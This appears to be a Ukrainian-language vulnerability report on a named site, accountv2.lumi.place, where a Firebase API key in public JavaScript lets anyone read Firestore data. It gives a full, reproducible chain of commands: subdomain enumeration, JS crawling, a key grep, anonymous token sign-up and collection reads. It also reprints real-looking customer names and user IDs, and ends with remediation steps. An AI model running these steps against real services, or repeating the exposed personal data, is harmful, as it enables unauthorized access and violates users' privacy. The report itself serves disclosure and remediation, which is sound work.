# Firebase API Key Leak — accountv2.lumi.place

**Дата:** 2026-05-30  
**Ціль:** accountv2.lumi.place  
**Тип:** Exposed Credentials + Insecure Firebase Security Rules  
**Severity:** Critical  
**Jira:** FA-11710  

---

## Опис вразливості

В публічному JS бандлі фронтенду `accountv2.lumi.place` знайдені хардкодовані Firebase API ключі для prod та dev середовищ. Ключі активні, анонімна авторизація увімкнена, Security Rules колекції `sessions` відкриті для анонімного читання. Підтверджено несанкціонований доступ до реальних даних користувачів.

---

## Як виявлено

### Крок 1 — Subdomain enumeration
Через Certificate Transparency логи знайдено субдомени цілі:

```bash
# crt.sh — публічний реєстр SSL сертифікатів
curl -s "https://crt.sh/?q=%.lumi.place&output=json" | jq '.[].name_value' | sort -u
```

Знайдено: `accountv2.lumi.place`, `try.lumi.place`, `links.lumi.place` та інші.

### Крок 2 — Fingerprinting
```bash
curl -sI https://accountv2.lumi.place | grep -E "HTTP|server"
# Server: AmazonS3 → статичний Next.js сайт на S3
```

### Крок 3 — Збір JS файлів
```bash
katana -u https://accountv2.lumi.place -jc -o js_urls.txt

# Завантаження chunks (фільтр проти дублів katana)
mkdir chunks
grep "accountv2.lumi.place/_next/static/chunks/[^/]*\.js" js_urls.txt | sort -u | while read url; do
    filename=$(basename "$url")
    curl -s "$url" -o chunks/"$filename"
done
```

### Крок 4 — Пошук credentials
```bash
grep -rhoP 'AIza[A-Za-z0-9_\-]{35}' chunks/
```

**Знахідка у файлі** `b056a0efc38c07cd.js`:
```
AIzaSy***REDACTED***  ← DEV  (projectId: title-app-dev)
AIzaSy***REDACTED***  ← PROD (projectId: title-app-f496c)
```

Повний конфіг витягнуто командою:
```bash
grep -o 'apiKey:"AIza[^}]*}' chunks/b056a0efc38c07cd.js
```

---

## Як тестувалось

### Тест 1 — Перевірка активності ключа
```bash
curl "https://www.googleapis.com/identitytoolkit/v3/relyingparty/getProjectConfig?key=<PROD_API_KEY>"
```

**Результат:** ключ активний, повертає `authorizedDomains`.

---

### Тест 2 — Анонімна авторизація
```bash
curl -s -X POST \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<PROD_API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"returnSecureToken":true}'
```

**Результат:** отримано валідний `idToken` — анонімна авторизація активна.

---

### Тест 3 — Читання Firestore з анонімним токеном
```bash
TOKEN="<idToken з тесту 2>"

# Перебір типових колекцій
for col in users profiles sessions orders payments subscriptions; do
    curl -s "https://firestore.googleapis.com/v1/projects/title-app-f496c/databases/(default)/documents/$col" \
      -H "Authorization: Bearer $TOKEN" | head -c 200
done
```

**Результат:** колекція `sessions` повністю відкрита.

---

### Тест 4 — Отримані реальні дані
```bash
curl -s "https://firestore.googleapis.com/v1/projects/title-app-f496c/databases/(default)/documents/sessions?pageSize=3" \
  -H "Authorization: Bearer $TOKEN"
```

**Отримано реальні записи:**

| userId | Назва сесії | Статус |
|---|---|---|
| `00d73d26-6499-4ffb-8cc4-c7087d1518a8` | October Outfit for Fallon Bartos | BOOKED |
| `5e6c4ad1-fff0-4520-9f4e-d62d8c619ef8` | Seasonal Capsule for April Ross | BOOKED |
| `805561c7-e646-46c0-bbd7-cc4f15b5822a` | Seasonal Capsule for Carli Ethridge | CANCELED |

---

## Вплив

- Будь-хто може отримати анонімний токен і читати колекцію `sessions`
- Витік userId, імен, статусів бронювань реальних користувачів
- Порушення GDPR — персональні дані доступні без авторизації
- DEV ключ також активний і має ту саму проблему

---

## Кроки для виправлення

| # | Дія | Пріоритет |
|---|---|---|
| 1 | Відкликати обидва ключі — Google Cloud Console → APIs & Services → Credentials | Негайно |
| 2 | Виправити Firebase Security Rules — заборонити анонімний доступ до `sessions` | Негайно |
| 3 | Відключити анонімну авторизацію в Firebase Auth | Сьогодні |
| 4 | Згенерувати нові ключі з обмеженням по домену | Сьогодні |
| 5 | Вивести `accountv2.lumi.place` з продакшну або закрити за auth | Цього тижня |

### Правильні Firebase Security Rules для `sessions`
```javascript
match /sessions/{sessionId} {
  // Тільки власник може читати свою сесію
  allow read: if request.auth != null && request.auth.uid == resource.data.userId;
  allow write: if false; // тільки через backend
}
```

---

## Висновок

Вразливість підтверджена практично — отримано реальні дані користувачів без жодних облікових даних за 4 кроки. Основна причина: хардкодований API ключ у публічному JS + відсутні Security Rules на колекцію Firestore.
